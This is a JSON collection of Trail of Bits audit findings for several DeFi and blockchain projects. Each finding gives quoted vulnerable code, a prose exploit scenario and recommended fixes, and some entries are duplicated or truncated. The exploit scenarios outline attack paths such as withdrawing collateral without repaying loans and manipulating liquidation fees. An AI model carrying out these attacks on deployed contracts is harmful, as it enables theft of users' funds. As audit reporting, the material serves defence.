        "body": "Users could bypass collateralization checks and reclaim their collateral assets without repaying their USDS loans. The withdrawCollateralAndClaim function withdraws WBTC/WETH collateral assets and sends any pending rewards to the caller. It includes checks to ensure that, after the withdrawal, the caller will still possess sucient collateral in the form of liquidity shares to maintain any outstanding loans before initiating the withdrawal of WBTC and WETH liquidity from the pool and sending the reclaimed tokens back to the user. 81 function withdrawCollateralAndClaim( uint256 collateralToWithdraw, uint256 minReclaimedWBTC, uint256 minReclaimedWETH, uint256 deadline ) public returns (uint256 reclaimedWBTC, uint256 reclaimedWETH) 82 83 { // Make sure that the user has collateral and if they have borrowed USDS that collateralToWithdraw doesn't bring their collateralRatio below allowable levels. 84 require( userShareForPool( msg.sender, collateralPoolID ) > 0, \"User does not have any collateral\" ); 85 require( collateralToWithdraw <= maxWithdrawableCollateral(msg.sender), \"Excessive collateralToWithdraw\" ); 86 87 // Withdraw the WBTC/WETH liquidity from the liquidity pool (sending the reclaimed tokens back to the user) 88 (reclaimedWBTC, reclaimedWETH) = withdrawLiquidityAndClaim( wbtc, weth, collateralToWithdraw, minReclaimedWBTC, minReclaimedWETH, deadline ); 89 } Figure 8.1: src/stable/Collateral.sol#L81-L88 However, the withdrawLiquidityAndClaim function, which is called by withdrawCollateralAndClaim, has public visibility with no access control mechanism in place. This means that the collateralization checks within the withdrawCollateralAndClaim function can be bypassed, and users can directly invoke withdrawLiquidityAndClaim to reclaim their liquidity assets while holding onto their USDS loans. 28 Salty.IO Security Assessment 77 function withdrawLiquidityAndClaim( IERC20 tokenA, IERC20 tokenB, uint256 liquidityToWithdraw, uint256 minReclaimedA, uint256 minReclaimedB, uint256 deadline ) public nonReentrant returns (uint256 reclaimedA, uint256 reclaimedB) 78 79 80 { // Make sure that the DAO isn't trying to remove liquidity require( msg.sender != address(exchangeConfig.dao()), \"DAO is not allowed to withdraw liquidity\" ); 81 82 83 84 (bytes32 poolID,) = PoolUtils._poolID( tokenA, tokenB ); // Reduce the user's liquidity share for the specified pool so that they receive less rewards. 85 // Cooldown is specified to prevent reward hunting (ie - quickly depositing and withdrawing large amounts of liquidity to snipe rewards) 86 well. 87 // This call will send any pending SALT rewards to msg.sender as // Note: _decreaseUserShare checks to make sure that the user has the specified liquidity share. 88 true ); 89 90 91 _decreaseUserShare( msg.sender, poolID, liquidityToWithdraw, // Remove the amount of liquidity specified by the user. // The liquidity in the pool is currently owned by this contract. (external call) 92 (reclaimedA, reclaimedB) = pools.removeLiquidity( tokenA, tokenB, liquidityToWithdraw, minReclaimedA, minReclaimedB, deadline ); 93 94 95 96 97 98 } // Transfer the reclaimed tokens to the user tokenA.safeTransfer( msg.sender, reclaimedA ); tokenB.safeTransfer( msg.sender, reclaimedB ); } Figure 8.2: src/staking/Liquidity.sol#L77-L98 Exploit Scenario Alice borrows USDS tokens from the protocol using her liquidity shares as collateral. Instead of repaying the loan to reclaim her liquidity shares, she directly accesses the withdrawLiquidityAndClaim function. By doing so, she withdraws her collateral assets while still holding onto her USDS loan, thereby stealing funds from the protocol. Recommendations Short term, restrict direct public access to the withdrawLiquidityAndClaim function. Consider changing its visibility to internal or introducing access control checks. Long term, review critical operations in the codebase and ensure that proper access control mechanisms are put in place. 29 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Lack of chain ID validation allows signature reuse across forks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "Without chain ID validation, a valid signature obtained on one blockchain fork or network can be reused on another with a dierent chain ID. The grantAccess function is responsible for validating a provided signature and granting access to a user within the context of a specic geographical version (geoVersion). It veries the authenticity of the signature, ensuring that it was generated by an authorized source, typically an o-chain verier. Upon successful verication, the users wallet status is upgraded and granted access. 56 // Grant access to the sender for the given geoVersion (which is incremented when new regions are restricted). 57 // Requires the accompanying correct message signature from the off chain verifier. 58 59 60 function grantAccess(bytes memory signature) public { require( verifyWhitelist(msg.sender, signature), \"Incorrect AccessManager.grantAccess signatory\" ); 61 62 63 _walletsWithAccess[geoVersion][msg.sender] = true; } Figure 9.1: The grantAccess function However, the signature schema does not account for the contracts chain. As a result, if the protocol is deployed on multiple chains, one valid signature will be reusable across all of the available forks. Recommendations Short term, add the chain ID opcode to the signature schema. Long term, identify and document the risks associated with having forks of multiple chains and develop related mitigation strategies. 30 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Chainlink oracles could return stale price data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The latestRoundData() function from Chainlink oracles returns ve values: roundId, answer, startedAt, updatedAt, and answeredInRound. The PriceConverter contract reads only the answer value and discards the rest. This can cause outdated prices to be used for token conversions. 27 // Returns a Chainlink oracle price with 18 decimals (converted from Chainlink's 8 decimals). 28 29 // Returns zero on any type of failure. function latestChainlinkPrice(address _chainlinkFeed) public view returns (uint256) 30 31 { AggregatorV3Interface chainlinkFeed = AggregatorV3Interface(_chainlinkFeed); 32 33 34 35 36 37 38 39 40 41 42 43 44 45 int256 price = 0; try chainlinkFeed.latestRoundData() returns ( uint80, // _roundID int256 _price, uint256, // _startedAt uint256, // _timeStamp uint80 // _answeredInRound ) { price = _price; } Figure 10.1: All returned data other than the answer value is ignored during the call to a Chainlink feeds latestRoundData method. (src/price_feed/CoreChainlinkFeed.sol#L67L71) According to the Chainlink documentation, if the latestRoundData() function is used, the updatedAt value should be checked to ensure that the returned value is recent enough for the application. 31 Salty.IO Security Assessment Recommendations Short term, make sure that the oracle queries check for up-to-date data. In the case of stale oracle data, have the latestRoundData() function return zero to indicate failure. Long term, review the documentation for Chainlink and other oracle integrations to ensure that all of the security requirements are met to avoid potential issues, and add tests that take these possible situations into account. 32 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Lack of timely price feed updates may result in loss of funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The prices used to check loan health and maximum borrowable value are updated manually by calling performUpkeep on the PriceAggregator contract. There are incentives to call the price update function, and the client has indicated it will be running a bot to perform this and other upkeeps, but there is no guarantee that this will happen. The most recently updated prices are stored in the _lastPriceOnUpkeepBTC and _lastPriceOnUpkeepETH lists; however, there is no indication as to when they were last updated. function _updatePriceBTC() internal { uint256 price1 = _getPriceBTC(priceFeed1); uint256 price2 = _getPriceBTC(priceFeed2); uint256 price3 = _getPriceBTC(priceFeed3); _lastPriceOnUpkeepBTC = _aggregatePrices(price1, price2, price3); } function _updatePriceETH() internal { uint256 price1 = _getPriceETH(priceFeed1); uint256 price2 = _getPriceETH(priceFeed2); uint256 price3 = _getPriceETH(priceFeed3); _lastPriceOnUpkeepETH = _aggregatePrices(price1, price2, price3); } // Cache the current prices of BTC and ETH until the next performUpkeep // Publicly callable without restriction as the function simply updates the BTC and ETH prices as read from the PriceFeed (which is a trusted source of price). function performUpkeep() public { _updatePriceBTC(); _updatePriceETH(); } 33 Salty.IO Security Assessment Figure 11.1: src/stable/Collateral.sol#L81-L88 Exploit Scenario The Salty.IO bot goes down and does not update prices. During this time, the market drops sharply. Because the prices are stale, Eve is able to borrow signicantly at inated prices. When the bot nally resumes, all of Eves loans are below 100% collateralization. Recommendations Short term, have the code store the timestamp of the last update and have the price checks revert if the timestamp is too old. Long term, remove the price caching pattern altogether and replace it with a check of the price feeds when getPriceBTC or getPriceETH are called. 34 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. USDS stablecoin may become undercollateralized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "In a downtrending market, a black swan type event could cause the USDS stablecoin to become undercollateralized. When a loan is liquidated, 5% of the collateral is sent to the liquidator as a fee. If 105% of the collateral is not received, the protocol will suer a loss. Furthermore, the collateral seized from liquidations is not immediately sold; instead, it is registered as a counterswap to be sold the next time a matching buy order is placed. In a downtrending market, especially during a ash crash, this forces the protocol to retain these assets as they decline in value. We also noted that the collateralization ratio is calculated assuming that the price of USDS is $1. Exploit Scenario The market crashes, and liquidations are triggered. The liquidations result in the seizure of WBTC and WETH, which are deposited in the Pools contract until a counterswap occurs. As the market continues to fall, no buy orders are placed, and no counterswaps are triggered. Salty.IO suers losses from being naked long the tokens. When the ash crash bottoms out and reverses, the counterswaps are immediately triggered, locking in the unrealized losses at the bottom. Recommendations Short term, analyze the issue and identify a possible solution for this problem. This problem does not have a simple solution and is inherent in the design of the protocol. Any solution should be thoughtfully considered and tested. Risks that are not addressed should be clearly documented. Long term, create a design specication that identies the interactions and risks between the protocols features. Test scenarios combined with fuzzing can be used to simulate adverse market conditions and identify weaknesses. 35 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Risk of denial-of-service attacks on token whitelisting process ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The token whitelisting process can be disrupted by a malicious user submitting spurious proposals. The proposeTokenWhitelisting function allows users to submit proposals for adding new tokens to the whitelist. If the requirements are met, it creates a unique proposal and includes it in the pending whitelisting proposals list. 121 function proposeTokenWhitelisting( IERC20 token, string memory tokenIconURL, string memory description ) public nonReentrant 122 123 124 125 { require( address(token) != address(0), \"token cannot be address(0)\" ); require( _openBallotsForTokenWhitelisting.length() < daoConfig.maxPendingTokensForWhitelisting(), \"The maximum number of token whitelisting proposals are already pending\" ); 126 require( poolsConfig.numberOfWhitelistedPools() < poolsConfig.maximumWhitelistedPools(), \"Maximum number of whitelisted pools already reached\" ); 127 require( ! poolsConfig.tokenHasBeenWhitelisted(token, exchangeConfig.wbtc(), exchangeConfig.weth()), \"The token has already been whitelisted\" ); 128 129 string memory ballotName = string.concat(\"whitelist:\", Strings.toHexString(address(token)) ); 130 131 uint256 ballotID = _possiblyCreateProposal( ballotName, BallotType.WHITELIST_TOKEN, address(token), 0, tokenIconURL, description, 2 * daoConfig.baseProposalCost() ); 132 133 _openBallotsForTokenWhitelisting.add( ballotID ); } Figure 1.1: src/dao/Proposals.sol#L121-L133 17 Salty.IO Security Assessment However, the maximum number of queueable token whitelisting proposals is currently capped at ve, which can be extended to a maximum of 12. This presents a potential vulnerability to denial-of-service attacks, as a malicious actor could persistently submit meaningless tokens to saturate the queue, thereby preventing legitimate token whitelisting proposals. 49 time. 50 51 // The maximum number of tokens that can be pending for whitelisting at any // Range: 3 to 12 with an adjustment of 1 uint256 public maxPendingTokensForWhitelisting = 5; Figure 1.2: src/dao/DAOConfig.sol#L49-L51 Furthermore, since voters may lack incentive to downvote these fraudulent proposals, the required quorum may never be reached to nalize the ballot, eectively blocking the service for an extended duration. Submitting a proposal requires a nonrefundable fee that is currently set at $500, which should prevent most frivolous attackers. However, this will not stop a motivated, well-funded attacker such as a competitor. Exploit Scenario When the Salty.IO protocol is deployed, Eve submits multiple proposals to whitelist fake tokens. These proposals ll up the queue, eectively obstructing the inclusion of genuine token whitelisting proposals in the queue. Once the protocol is able to get a quorum to remove one of the proposals, Eves bot immediately back runs the transaction with another proposal. Recommendations Short term, implement a mechanism that allows an authorized entity to remove undesirable or unwanted token whitelisting proposals from the queue of proposals. Alternatively, implement a larger sized deposit that would be returned to a legitimate proposer. Long term, review critical codebase operations to ensure consistent and comprehensive logging of essential information, promoting transparency, troubleshooting, and ecient system management. 18 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. Insu\u0000cient event generation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The protocol does not use events at all. As a result, it will be dicult to review the contracts behavior for correctness once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. Exploit Scenario An attacker discovers a vulnerability in one of the Salty.IO protocol contracts and modies its execution. Because these actions generate no events, the behavior goes unnoticed until there is follow-on damage, such as nancial loss. Recommendations Short term, add events for all operations that could contribute to a higher level of monitoring and alerting. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components. 19 Salty.IO Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Transactions to add liquidity may be front run ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "Even with a properly set slippage guard, a depositor calling addLiquidity can be front run by a sole liquidity holder, which would cause the depositor to lose funds. When either of the reserves of a pool is less than the dust (100 wei), any call to addLiquidity will cause the pool to reset the reserves ratio. // If either reserve is less than dust then consider the pool to be empty and that the added liquidity will become the initial token ratio if ( ( reserve0 <= PoolUtils.DUST ) || ( reserve1 <= PoolUtils.DUST ) ) { // Update the reserves reserves.reserve0 += maxAmountA; reserves.reserve1 += maxAmountB; return ( maxAmountA, maxAmountB, Math.sqrt(maxAmountA * maxAmountB) ); } Figure 3.1: src/pools/Pools.sol#L112-L120 Exploit Scenario Eve is the sole liquidity holder in the WETH/DAI pool, which has reserves of 100 WETH and 200,000 DAI, for a ratio of 1:2,000.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Liquidation fee is volatile and may be manipulated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "The liquidation reward is intended to be 5% of the liquidity seized, but in actuality, it may range from close to 0% to close to 10%. The Salty.IO liquidation process is straightforward. When the loan-to-value (LTV) ratio of a loan drops below the threshold, liquidateUser may be called by anyone, and it will immediately liquidate the loan by removing the liquidity, seizing the WBTC and WETH, and paying a fee to the caller. The fee is intended to be 5% of the amount liquidated, which is estimated as 10% of the WETH seized. This assumes the WETH and WBTC will be equal in value. However, due to market forces, the actual ratio of values will diverge from 50:50 even if that was the ratio of the values of the initial deposit. // Liquidate a position which has fallen under the minimum collateral ratio. // A default 5% of the value of the collateral is sent to the caller, with the rest being sent to the Liquidator for later conversion to USDS which is then burned. function liquidateUser( address wallet ) public nonReentrant  // The caller receives a default 5% of the value of the liquidated collateral so we can just send them default 10% of the reclaimedWETH (as WBTC/WETH is a 50/50 pool). uint256 rewardedWETH = (2 * reclaimedWETH * stableConfig.rewardPercentForCallingLiquidation()) / 100;  // Reward the caller weth.safeTransfer( msg.sender, rewardedWETH ); Figure 6.1: src/stable/Collateral.sol#L144-L184 The value of WETH can be further manipulated by sandwiching a call to liquidateUser with a WBTC/WETH swap transaction, which could push the reserves of either token to 24 Salty.IO Security Assessment close to the dust amount. This could double the amount of WETH received by the liquidator; alternatively, it could reduce the amount of WETH to almost zero. Users who want to add liquidity, called LPs, and participate in LP staking rewards are expected to call the Liquidity contract; however, a user could also call addLiquidity directly on a pool, bypassing the AccessManager access control and associated geolocation check. Furthermore, a user may believe that by doing so they will participate in the arbitrage prot rewards, but in fact, they will not. Exploit Scenario Alice takes out a loan of USDS against her WBTC/WETH. Subsequently, Eve notices the LTV of the loan is below the threshold. She submits a transaction: 1. It rst swaps WETH for a signicant amount of WBTC from the collateral pool. 2. It then calls liquidateUser, and due to the estimate based on WETH, Alice receives signicantly more WETH than she was entitled to.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. USDS stablecoin may become undercollateralized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf",
        "body": "In a downtrending market, a black swan type event could cause the USDS stablecoin to become undercollateralized. When a loan is liquidated, 5% of the collateral is sent to the liquidator as a fee. If 105% of the collateral is not received, the protocol will suer a loss. Furthermore, the collateral seized from liquidations is not immediately sold; instead, it is registered as a counterswap to be sold the next time a matching buy order is placed. In a downtrending market, especially during a ash crash, this forces the protocol to retain these assets as they decline in value. We also noted that the collateralization ratio is calculated assuming that the price of USDS is $1. Exploit Scenario The market crashes, and liquidations are triggered. The liquidations result in the seizure of WBTC and WETH, which are deposited in the Pools contract until a counterswap occurs. As the market continues to fall, no buy orders are placed, and no counterswaps are triggered. Salty.IO suers losses from being naked long the tokens. When the ash crash bottoms out and reverses, the counterswaps are immediately triggered, locking in the unrealized losses at the bottom. Recommendations Short term, analyze the issue and identify a possible solution for this problem. This problem does not have a simple solution and is inherent in the design of the protocol. Any solution should be thoughtfully considered and tested. Risks that are not addressed should be clearly documented. Long term, create a design specication that identies the interactions and risks between the protocols features. Test scenarios combined with fuzzing can be used to simulate adverse market conditions and identify weaknesses. 35 Salty.IO Security Assessment 13. Zap operations may approve an incorrect number of tokens, leading to reversion Severity: Low Diculty: Low Type: Data Validation Finding ID: TOB-SALTY-13 Target: src/staking/Liquidity.sol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Double entrypoint or DeFi integrated ERC20 tokens should not be used ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-offchain-labs-custom-fee-token-securityreview.pdf",
        "body": "The use of ERC20 tokens with two or more entrypoints can allow an attack to drain the bridge. The use of ERC20 tokens for paying fees in the rollup/bridge requires a number of checks and restrictions to avoid loss of funds. One of these checks is implemented in the bridge when a withdraw is executed: function _executeLowLevelCall( address to, uint256 value, bytes memory data ) internal override returns (bool success, bytes memory returnData) { // we don't allow outgoing calls to native token contract because it could // result in loss of native tokens which are escrowed by ERC20Bridge if (to == nativeToken) { gvladika marked this conversation as resolved. revert CallTargetNotAllowed(nativeToken); } // first release native token IERC20(nativeToken).safeTransfer(to, value); success = true;  Figure 1.1: Header of the _executeLowLevelCall function in src/bridge/ERC20Bridge.sol Users are not allowed to directly call the native token address; otherwise, they could transfer funds out. However, this check will not be sucient if the token has more than one entrypoint (e.g., when two dierent addresses can be used to execute ERC20 operations, such as transfer). Another problematic type of ERC20 is tightly integrated in DeFi applications. For instance, the LUSD ERC20 token contains the following function: function burn(address _account, uint256 _amount) external override { _requireCallerIsBOorTroveMorSP(); _burn(_account, _amount); } Figure 1.2: Burn function from the LUSD token This token can be minted or burned through a manager contract (which is dierent from the token contract itself), thereby bypassing the above check. In particular, this DeFi allows LUSD token owners to open, close, or repay vaults, so all of the bridge ERC20 LUSD could be easily manipulated using the low-level callback without requiring allowances to be set up. Exploit Scenario A user creates a rollup that uses a double entrypoint tokens for fees, allowing any user to drain the bridge contract. Recommendations Short term, clearly document this limitation to make sure of this potential security issue. Long term, review the assumptions required by ERC20 tokens in order to be integrated in each component. References  Medium-severity bug in Balancer Labs",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Token bridge will receive and lock ether ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-offchain-labs-custom-fee-token-securityreview.pdf",
        "body": "The token bridges entrypoint for deposits can receive ether, but the token bridge cannot retrieve it in any way. Users deposit ERC20 tokens using the outboundTransfer* functions from the token bridge. An example is shown below: function outboundTransferCustomRefund( address _l1Token, address _refundTo, address _to, uint256 _amount, uint256 _maxGas, uint256 _gasPriceBid, bytes calldata _data ) public payable override returns (bytes memory res) {  Figure 1.2: Header of the outboundTransferCustomRefund function in src/tokenbridge/ethereum/gateway/L1OrbitERC20Gateway.sol This function will trigger the creation of a retryable ticket, so it needs funds to pay fees and gas. These fees can be paid using ether or some specic ERC20, but in dierent token bridge deployments that share the same interface. In the latter case, the entry function should not receive ether even though it is payable. Exploit Scenario A user accidentally provides ether to a token bridge associated with a rollup that uses a custom ERC20 token fee. The ether will be locked in the token bridge. Recommendations Short term, add a condition that checks the value provided into the outboundTransfer function, and have the function revert if the value is positive. Long term, review how funds ow from the user to/from dierent components, and ensure that there are no situations where tokens can be trapped. 3. Cross-chain message out-of-order execution could a\u0000ect correct token bridge deployment Severity: Medium Diculty: High Type: Undened Behavior Finding ID: TOB-ARB-CFT-002 Target: tokenbridge/ethereum/L1AtomicTokenBridgeCreator.sol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. Token bridge will receive and lock ether ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-offchain-labs-custom-fee-token-securityreview.pdf",
        "body": "The token bridges entrypoint for deposits can receive ether, but the token bridge cannot retrieve it in any way. Users deposit ERC20 tokens using the outboundTransfer* functions from the token bridge. An example is shown below: function outboundTransferCustomRefund( address _l1Token, address _refundTo, address _to, uint256 _amount, uint256 _maxGas, uint256 _gasPriceBid, bytes calldata _data ) public payable override returns (bytes memory res) {  Figure 1.2: Header of the outboundTransferCustomRefund function in src/tokenbridge/ethereum/gateway/L1OrbitERC20Gateway.sol This function will trigger the creation of a retryable ticket, so it needs funds to pay fees and gas. These fees can be paid using ether or some specic ERC20, but in dierent token bridge deployments that share the same interface. In the latter case, the entry function should not receive ether even though it is payable. Exploit Scenario A user accidentally provides ether to a token bridge associated with a rollup that uses a custom ERC20 token fee. The ether will be locked in the token bridge. Recommendations Short term, add a condition that checks the value provided into the outboundTransfer function, and have the function revert if the value is positive. Long term, review how funds ow from the user to/from dierent components, and ensure that there are no situations where tokens can be trapped.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Cross-chain message out-of-order execution could a\u0000ect correct token bridge deployment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-offchain-labs-custom-fee-token-securityreview.pdf",
        "body": "Out-of-order execution of outbox transactions on L1 and retryable tickets on L2 can lead to unexpected results when a token bridge is created. This issue relies on the specic ordering of retryable tickets. The token bridge creation requires retryable tickets to be submitted and executed in a certain order: /** * @notice Deploy and initialize token bridge, both L1 and L2 sides, as part of a single TX. * @dev This is a single entrypoint of L1 token bridge creator. Function deploys L1 side of token bridge and then uses * 2 retryable tickets to deploy L2 side. 1st retryable deploys L2 factory. And then 'retryable sender' contract * is called to issue 2nd retryable which deploys and inits the rest of the contracts. L2 chain is determined by `inbox` parameter. * * * Token bridge can be deployed only once for certain inbox. Any further calls to `createTokenBridge` will revert * because L1 salts are already used at that point and L1 contracts are already deployed at canonical addresses for that inbox. * */ function createTokenBridge( address inbox, address rollupOwner, uint256 maxGasForContracts, uint256 gasPriceBid ) external payable {  Figure 3.1: Header of the createTokenBridge function in L1AtomicTokenBridgeCreator.sol However, a malicious user can leverage the out-of-order execution of retryable tickets to break the assumptions of the token bridge creator and produce a failed deployment. Exploit Scenario Alice starts the deployment of a canonical token bridge for a new rollup. Eve notices this deployment and spams the rollup bridge with transactions to increase the L2 gas cost, and the tickets are not auto-redeemed. Later, Eve can trigger the tickets out of order to produce a broken deployment. Alice will not be able to redeploy, and no canonical deployment of the token bridge can be used. Recommendations Short term, consider migrating part of the deployment steps to L2 and require a single retryable ticket to be executed. Long term, review all possible ways in which the out-of-order execution of retryable tickets may aect each component and document. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Sensitive material stored in les with loose permissions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-seda-chaintokenmigration-securityreview.pdf",
        "body": "The SEDA node client stores sensitive material using overly loose le or folder permissions of 755 or higher. This includes the VRF key le in gures 1.1 and 1.2, the validator state le in gure 1.3, and the validator conguration le in gure 1.4. The nal example is in a le that instruments end-to-end testing and is included for thoroughness. pvKeyFile := config.PrivValidatorKeyFile() if err := os.MkdirAll(filepath.Dir(pvKeyFile), 0o755); err != nil { return nil, fmt.Errorf(\"could not create directory %q: %w\", filepath.Dir(pvKeyFile), err) } Figure 1.1: The validator key le is stored in a directory with permission code 755, allowing every user on the system to view the le. (seda-chain/app/utils/vrf_key.go#229232) keyFilePath := config.PrivValidatorKeyFile() if err := os.MkdirAll(filepath.Dir(keyFilePath), 0o777); err != nil { return fmt.Errorf(\"could not create directory %q: %w\", filepath.Dir(keyFilePath), err) } Figure 1.2: The validator key le is stored in a directory with permission code 777, allowing every user on the system to view and modify the le. (seda-chain/cmd/sedad/cmd/init.go#4043) stateFilePath := config.PrivValidatorStateFile() if err := os.MkdirAll(filepath.Dir(stateFilePath), 0o777); err != nil { return fmt.Errorf(\"could not create directory %q: %w\", filepath.Dir(stateFilePath), err) } Figure 1.3: The validator state le is stored in a directory with permission code 777, allowing every user on the system to view and modify the le. (seda-chain/cmd/sedad/cmd/init.go#4447) func (v *validator) createConfig() error { p := path.Join(v.configDir(), \"config\") return os.MkdirAll(p, 0o755) } Figure 1.4: The node conguration le is stored in a directory with permission code 755, allowing every user on the system to view the le. (seda-chain/e2e/validator.go#6467) The code path in gure 1.4 is part of the test suite, not production code. Exploit Scenario A validator operator runs a node on a major cloud platform that includes a low-permission logging and metrics daemon on each compute instance used by its clients. Since SEDAs key material is stored in les permissioned so that any user on the system may view their contents, compromise of the logging daemon leads to compromise of the private key. Recommendations Short term, modify the created directory permissions to use permission code 0750, or a more restrictive code if possible. This modication should include less sensitive les such as the conguration and state les because enforcing rules around le permissions is easier if the rules are the same regardless of le content. Long term, establish internal code quality guidelines that establish the proper methods through which les can be created. This nding was discovered using Gosec, so the SEDA repository may benet from more regular use of Gosec or from making it a requirement in the repositorys CI pipeline.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. panic() is overused for error management ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-seda-chaintokenmigration-securityreview.pdf",
        "body": "The SEDA Cosmos modules for staking and vesting use panic() statements for certain error cases, as shown in gures 2.1 and 2.2. Gos panic mechanism is not recommended for use in Go applications except for the most fatal errors that require an immediate halt of the applications runtime. maxEntries, err := k.MaxEntries(ctx) if err != nil { panic(err) } valSrcAddr, err := sdk.ValAddressFromBech32(toRedelegation.ValidatorSrcAddress) if err != nil { panic(err) } valDstAddr, err := sdk.ValAddressFromBech32(toRedelegation.ValidatorDstAddress) if err != nil { panic(err) } Figure 2.1: The panic() statement is used to immediately terminate the application in the staking module. (seda-chain/x/staking/keeper/keeper.go#6274) if !toClawBackStaking.IsZero() { panic(\"failed to claw back full amount\") } Figure 2.2: The panic() statement is used to immediately terminate the application in the vesting module. (seda-chain/x/vesting/keeper/msg_server.go#257259) Exploit Scenario The code containing panic() statements is called by out-of-block code (e.g., during the BeginBlock and EndBlock functions), and the panic causes the chain to halt. In the chains current state, this scenario is not possible, but given SEDAs planned changes, consider avoiding these panic-induced chain halts. Recommendations Short term, change uses of panic() to normal Go errors where applicable. Long term, consider banning the use of panic() in SEDAs code-contributing guidelines. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf",
        "body": "The Raft Finance contracts have enabled compiler optimizations. There have been several optimization bugs with security implications. Additionally, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild use them, so how well they are being tested and exercised is unknown. High-severity security issues due to optimization bugs have occurred in the past. For example, a high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG . Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity v0.5.6 . More recently, a bug due to the incorrect caching of Keccak-256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Raft Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Issues with Chainlink oracles return data validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf",
        "body": "Chainlink oracles are used to compute the price of a collateral token throughout the protocol. When validating the oracle's return data, the returned price is compared to the price of the previous round. However, there are a few issues with the validation:    The increase of the currentRoundId value may not be statically increasing across rounds. The only requirement is that the roundID increases monotonically. The updatedAt value in the oracle response is never checked, so potentially stale data could be coming from the priceAggregator contract. The roundId and answeredInRound values in the oracle response are not checked for equality, which could indicate that the answer returned by the oracle is fresh. function _badChainlinkResponse (ChainlinkResponse memory response) internal view returns ( bool ) { return !response.success || response.roundId == 0 || response.timestamp == 0 || response.timestamp > block.timestamp || response.answer <= 0 ; } Figure 2.1: The Chainlink oracle response validation logic Exploit Scenario The Chainlink oracle attempts to compare the current returned price to the price in the previous roundID . However, because the roundID did not increase by one from the previous round to the current round, the request fails, and the price oracle returns a failure. A stale price is then used by the protocol. Recommendations Short term, have the code validate that the timestamp value is greater than 0 to ensure that the data is fresh. Also, have the code check that the roundID and answeredInRound values are equal to ensure that the returned answer is not stale. Lastly check that the timestamp value is not decreasing from round 